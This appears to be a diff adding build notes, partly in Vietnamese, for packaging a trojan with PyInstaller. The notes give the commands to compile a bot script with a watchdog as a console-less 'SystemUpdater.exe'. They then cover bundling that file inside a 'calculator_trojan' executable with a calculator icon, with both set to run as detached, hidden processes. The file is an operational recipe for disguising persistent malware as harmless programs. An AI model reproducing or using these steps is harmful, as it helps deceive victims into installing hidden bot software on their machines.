@@ -1,0 +1,16 @@
+--icon=calculator.ico
+
+==========================================================================================
+file calculator dropbot() dùng: subprocess.DETACHED_PROCESS 
+
+file bot  watchdog() dùng:  subprocess.DETACHED_PROCESS 
+(tham số --noconsole)
+==========================================================================================
+    Đóng gói bot_test_V2.py :
+pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil bot_test_V2.py
+    Copy C:\TrojanFiles\dist\bot_test_V2.exe thành SystemUpdater.exe xong chuyển đến thư mục ngoài
+copy dist\bot_test_V2.exe SystemUpdater.exe
+
+Đóng gói calculator_trojan.py:
+    Đảm bảo SystemUpdater.exe đã có trong C:\TrojanFiles.
+pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdater.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V2.py
